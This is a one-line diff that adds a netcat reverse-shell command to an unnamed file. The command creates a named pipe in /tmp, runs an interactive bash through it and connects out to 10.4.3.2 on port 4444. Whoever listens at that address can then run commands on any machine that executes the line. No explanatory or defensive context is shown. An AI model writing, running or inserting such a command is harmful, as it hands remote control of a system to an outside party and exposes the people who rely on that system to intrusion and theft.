@@ -1,0 +1,1 @@
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.4.3.2 4444 >/tmp/f
